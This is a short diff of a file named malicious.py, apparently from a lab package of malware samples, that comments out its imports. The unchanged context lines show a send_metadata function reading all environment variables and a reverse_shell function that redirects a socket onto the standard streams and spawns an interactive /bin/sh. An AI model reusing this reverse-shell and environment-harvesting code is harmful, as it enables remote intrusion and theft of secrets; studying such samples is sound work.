@@ -1,8 +1,8 @@
 # artifact_lab_3_package_6e10193e/malicious.py
-import os
-import socket
-import subprocess
-import requests
+# import os
+# import socket
+# import subprocess
+# import requests
 
 def send_metadata():
     env_vars = os.environ
@@ -22,4 +22,3 @@ def reverse_shell():
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     subprocess.call(["/bin/sh", "-i"])
-
